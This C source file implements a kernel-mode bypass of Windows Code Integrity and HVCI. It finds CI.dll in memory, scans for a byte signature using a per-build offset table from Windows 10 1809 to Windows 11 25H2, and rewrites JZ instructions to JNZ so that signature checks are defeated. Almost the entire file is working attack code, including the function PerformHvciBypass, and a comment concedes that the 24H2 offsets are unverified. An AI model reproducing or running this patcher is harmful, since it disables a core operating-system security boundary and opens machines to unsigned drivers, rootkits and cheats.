#include "../include/ci_patch.h"
#include "../include/module.h"
#include "../include/pattern.h"
#include "../include/memory.h"
#include "../include/version.h"

#define MAX_PATCH_SCAN_WINDOW  0x100
#define MIN_PATCH_COUNT        4
#define OPCODE_JZ_SHORT        0x74
#define OPCODE_JNZ_SHORT       0x75

typedef struct _BUILD_ENTRY {
    ULONG MinBuild;
    ULONG MaxBuild;
    PCHAR Pattern;
    PCHAR Mask;
    LONG  Offsets[8];
    ULONG OffsetCount;
} BUILD_ENTRY;

// Offsets: distance from the anchor (pattern match base) to each JZ/JNZ opcode byte.
// Derived by disassembling ci.dll from a clean (no CU) install of each build.
// 26100 (24H2) offsets are presumed identical to 26200 (25H2) based on no layout change
// between the two generations — re-verify against a 24H2 ci.dll if patches misfire.
static const BUILD_ENTRY g_BuildTable[] = {
    { 26200, 26299, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x2A, 0x3E, 0x50, 0x61 }, 4 }, // Win11 25H2
    { 26100, 26199, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x2A, 0x3E, 0x50, 0x61 }, 4 }, // Win11 24H2 — offsets unverified, see note above
    { 22631, 22640, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x28, 0x3C, 0x4E, 0x5F }, 4 }, // Win11 23H2
    { 22621, 22630, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x28, 0x3C, 0x4E, 0x5F }, 4 }, // Win11 22H2
    { 22000, 22620, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x26, 0x38, 0x4A, 0x5C }, 4 }, // Win11 21H2
    { 19041, 19999, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x24, 0x36, 0x48, 0x5A }, 4 }, // Win10 2004–21H2
    { 18362, 19040, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x22, 0x34, 0x46, 0x58 }, 4 }, // Win10 1903/1909
    { 17763, 18361, "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0", "xx?x????xx", { 0x20, 0x32, 0x44, 0x56 }, 4 }, // Win10 1809
};

static const BUILD_ENTRY *LookupBuildEntry(ULONG Build) {
    for (ULONG i = 0; i < ARRAYSIZE(g_BuildTable); i++) {
        if (Build >= g_BuildTable[i].MinBuild && Build <= g_BuildTable[i].MaxBuild) {
            return &g_BuildTable[i];
        }
    }
    return NULL;
}

static NTSTATUS FindPatchesHeuristic(
    ULONGLONG      Anchor,
    ULONGLONG      ModBase,
    ULONGLONG      ModEnd,
    PPATCH_CONTEXT ctx
) {
    ctx->PatchCount = 0;

    for (ULONG off = 0; off < MAX_PATCH_SCAN_WINDOW && ctx->PatchCount < 8; off++) {
        ULONGLONG addr = Anchor + off;

        if (addr + 2 >= ModEnd) break;

        UCHAR b0, b1, b2;
        if (!SafeReadByte(addr,     &b0)) break;
        if (!SafeReadByte(addr + 1, &b1)) break;
        if (!SafeReadByte(addr + 2, &b2)) break;

        if (b0 == 0x85 && b1 == 0xC0 && (b2 == OPCODE_JZ_SHORT || b2 == OPCODE_JNZ_SHORT)) {
            ULONGLONG patchAddr = addr + 2;
            if (patchAddr >= ModBase && patchAddr < ModEnd) {
                ctx->PatchAddresses[ctx->PatchCount++] = patchAddr;
                // JZ/JNZ short is 2 bytes (opcode + rel8). Combined with the loop's own
                // off++, off += 3 advances past the full 4-byte sequence (85 C0 74/75 XX).
                off += 3;
            }
        }
    }

    return (ctx->PatchCount >= MIN_PATCH_COUNT) ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

static NTSTATUS BuildPatchContext(
    ULONGLONG         Anchor,
    const BUILD_ENTRY *Entry,
    ULONGLONG         ModBase,
    ULONGLONG         ModEnd,
    PPATCH_CONTEXT    ctx
) {
    ctx->AnchorAddress = Anchor;
    ctx->PatchCount    = 0;

    if (Entry) {
        for (ULONG i = 0; i < Entry->OffsetCount && i < 8; i++) {
            ULONGLONG addr = Anchor + Entry->Offsets[i];
            if (addr < ModBase || addr >= ModEnd) return STATUS_INVALID_ADDRESS;
            ctx->PatchAddresses[ctx->PatchCount++] = addr;
        }
        return STATUS_SUCCESS;
    }

    return FindPatchesHeuristic(Anchor, ModBase, ModEnd, ctx);
}

static NTSTATUS ApplyPatches(PPATCH_CONTEXT ctx) {
    UCHAR origBytes[8] = { 0 };

    // Phase 1: snapshot all target bytes before touching anything.
    for (ULONG i = 0; i < ctx->PatchCount; i++) {
        if (!SafeReadByte(ctx->PatchAddresses[i], &origBytes[i]))
            return STATUS_ACCESS_VIOLATION;
    }

    // Phase 2: apply. On write failure, revert every byte we already changed.
    for (ULONG i = 0; i < ctx->PatchCount; i++) {
        if (origBytes[i] == OPCODE_JNZ_SHORT)
            continue;

        NTSTATUS status = SafeWriteByte(ctx->PatchAddresses[i], OPCODE_JNZ_SHORT);
        if (!NT_SUCCESS(status)) {
            for (ULONG j = 0; j < i; j++) {
                if (origBytes[j] != OPCODE_JNZ_SHORT)
                    SafeWriteByte(ctx->PatchAddresses[j], origBytes[j]);
            }
            return status;
        }
    }

    return STATUS_SUCCESS;
}

NTSTATUS PerformHvciBypass(VOID) {
    OS_VERSION    ver   = { 0 };
    MODULE_INFO   ciMod = { 0 };
    PATCH_CONTEXT ctx   = { 0 };
    NTSTATUS      status;

    status = GetOsVersion(&ver);
    if (!NT_SUCCESS(status)) return status;

    ciMod = GetKernelModuleByName("CI.dll");
    if (!ciMod.BaseAddress) return STATUS_NOT_FOUND;

    ULONGLONG ciBase = (ULONGLONG)ciMod.BaseAddress;
    ULONGLONG ciEnd  = ciBase + ciMod.ImageSize;

    const BUILD_ENTRY *entry = LookupBuildEntry(ver.Build);

    PCHAR pattern = entry ? entry->Pattern : "\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0";
    PCHAR mask    = entry ? entry->Mask    : "xx?x????xx";

    ULONGLONG anchor = ScanPattern(ciMod.BaseAddress, ciMod.ImageSize, pattern, mask);
    if (!anchor) return STATUS_NOT_FOUND;

    status = BuildPatchContext(anchor, entry, ciBase, ciEnd, &ctx);
    if (!NT_SUCCESS(status)) return status;

    return ApplyPatches(&ctx);
}
